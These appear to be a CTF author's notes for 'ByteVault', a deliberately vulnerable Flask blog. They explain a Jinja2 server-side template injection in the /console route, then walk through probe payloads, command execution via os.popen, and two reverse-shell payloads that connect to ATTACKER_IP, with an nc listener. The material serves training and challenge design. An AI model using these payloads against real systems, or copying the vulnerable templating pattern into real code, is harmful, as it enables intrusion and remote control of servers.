# ByteVault — CTF Challenge Notes
## Category: Web | Difficulty: Medium

---

## CHALLENGE DESCRIPTION (show to players)

> ByteVault is a community developer blog with a built-in Python sandbox for running quick snippets.
> The sandbox claims to run Python in a "restricted environment" — but something is very wrong with how it works.
>
> **Goal:** Achieve Remote Code Execution and read `/home/www-data/user.txt`
>
> Target: `http://<your-ip>:5000`

---

## VULNERABILITY

**Location:** `POST /console` — the `code` form field

**Root Cause:** The `/console` route in `app.py` takes the user's submitted code and
interpolates it directly into a Jinja2 template string via Python f-string, then
calls `render_template_string()` on the result — without any sanitization:

```python
template = f"""
...
<pre class="output-pre">{code}</pre>   ← code lands here in the raw template
...
"""
return render_template_string(template)
```

The `code` value is baked into the *template source* before Jinja2 ever sees it.
So any Jinja2 expression embedded in `code` gets evaluated as template logic —
the "sandbox" is not executing Python at all. It is a convincing decoy.

---

## EXPLOITATION PATH

### Step 1 — Discover the Oddity
Visit `/console`. Type a normal Python snippet:

```python
print("hello")
```

Notice the output just echoes the raw code back — it's not executing anything.
The "sandbox" is fake.

### Step 2 — Probe for SSTI
Try injecting a Jinja2 expression instead of Python code:

```
{{7*7}}
```

If the output shows `49` — it's a Server-Side Template Injection vulnerability!

### Step 3 — Confirm Python Object Access

```
{{config}}
```
Returns the Flask config dump — confirms Jinja2 with full Python context.

```
{{self.__class__.__mro__}}
```
Returns the MRO chain — confirms unrestricted Python object traversal.

### Step 4 — RCE via os.popen

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Should return something like: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

### Step 5 — Reverse Shell

Set up listener on attacker machine:
```bash
nc -lvnp 4444
```

Submit this payload in the console code box:
```jinja2
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read()}}
```

Or via subclass chain to `subprocess.Popen`:
```jinja2
{{''.__class__.__mro__[1].__subclasses__()[<POPEN_INDEX>](
  ['bash','-c','bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'],
  stdout=-1,stderr=-1
).communicate()}}
```

### Step 6 — Get the Flag
```bash
whoami       # www-data
cat /home/www-data/user.txt
```

---

## WHAT MAKES THIS BETTER THAN THE SEARCH VERSION

| Aspect | Search-box SSTI | Console SSTI |
|---|---|---|
| Believability | Moderate — why would search render templates? | High — "Python sandbox" naturally suggests code evaluation |
| Misdirection | None | Strong — players assume real code execution is happening |
| Red herring | None | The fake "restricted environment" notice creates false confidence |
| Discovery path | Obvious reflection → test `{{7*7}}` | Player must first realize the console is *not* executing Python |
| Realism | Generic | Mimics real-world "online judge" / playground apps |

---

## DEPLOY

```bash
cd bytevault-ctf-v2/
docker build -t bytevault-ctf .
docker run -d -p 5000:5000 --name bytevault bytevault-ctf
```


## Author 
Kaustav Das
